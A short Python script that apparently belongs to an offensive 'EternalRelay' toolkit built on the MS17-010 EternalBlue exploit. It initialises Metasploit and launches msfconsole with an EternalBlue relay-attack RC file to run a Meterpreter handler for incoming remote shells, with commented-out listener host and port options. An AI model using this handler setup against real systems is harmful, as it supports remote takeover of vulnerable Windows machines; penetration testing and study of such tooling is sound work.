#!/usr/bin/python
#
# Payload generation and eternalblue_sc_merge.py credit go to Worawit Wang (sleepya)
# https://github.com/worawit/MS17-010

import sys
import os
import subprocess

from argparse import ArgumentParser

def main():

    parser = ArgumentParser(description='CLI tool for starting the EternalRelay Meterpreter handler using the included Metasploit RC file')

#    parser.add_argument('--lhost32', default='0.0.0.0', help='LHOST for 32-bit Meterpreter payload')
#    parser.add_argument('--lhost64', default='0.0.0.0', help='LHOST for 64-bit Meterpreter payload')
#    parser.add_argument('--lport32', default=4445, help='LPORT for 32-bit Meterpreter payload')
#    parser.add_argument('--lport64', default=4444, help='LPORT for 64-bit Meterpreter payload')
    parser.add_argument('--rc-path', default='{}/impacket/impacket/examples/ntlmrelayx/utils/rc/eternalblue-relay-attack.rc'.format(os.getcwd()), help='Path to EternalRelay RC file')

    args = parser.parse_args()

#    lport32 = args.lport32
#    lport64 = args.lport64
    rc = args.rc_path

    try:
        print "[*] Initializing Metasploit..."
        os.system('msfdb init')

        print "[*] Starting Meterpreter handler for eternalrelayx.py (loading {})...".format(rc)
        os.system("msfconsole -r {}".format(rc))

    except KeyboardInterrupt:
        print "[-] Detected keyboard interrupt!"

if __name__ == '__main__':

    main()
